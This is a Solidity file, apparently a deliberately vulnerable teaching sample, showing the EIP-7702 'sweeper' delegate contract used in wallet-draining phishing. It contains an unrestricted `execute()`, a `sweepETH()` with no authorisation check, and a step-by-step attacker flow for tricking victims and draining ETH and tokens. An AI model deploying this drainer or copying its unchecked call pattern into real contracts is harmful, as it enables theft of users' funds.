// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title DC07_SweeperDelegate (VULNERABLE)
 * @notice Demonstrates the Sweeper Pattern — DC-07
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *
 * BUG: This delegate contract has an `execute()` function with NO call-target
 * allowlist and NO asset-transfer constraints. Any external caller can invoke
 * the EOA (which delegates here) and drain all assets in one call.
 *
 * This is the #1 live phishing exploit class post-EIP-7702.
 * Attacker flow:
 *   1. Deploy this contract.
 *   2. Trick victim into signing an EIP-7702 authorization pointing here.
 *   3. Call victim EOA with `execute(attacker, "")` → all ETH drained.
 *   4. Call again with ERC-20 transferFrom calldata → tokens drained.
 */
contract DC07_SweeperDelegate {

    /**
     * @notice Execute an arbitrary call from the delegating EOA's context.
     * @dev VULNERABLE: zero restrictions on target or calldata.
     *      Because this runs via DELEGATECALL from the EOA, msg.sender is
     *      whoever called the EOA externally — the attacker.
     */
    function execute(address target, bytes calldata data)
        external
        payable
        returns (bool success, bytes memory returnData)
    {
      
        (success, returnData) = target.call{value: msg.value}(data);
        require(success, "call failed");
    }

    /**
     * @notice Drain all ETH from the EOA to a target in one shot.
     * @dev VULNERABLE: explicit sweep helper — exactly the pattern seen in
     *      the August 2025 phishing campaigns.
     */
    function sweepETH(address payable target) external {
        //  No auth check
        (bool ok,) = target.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {}
}
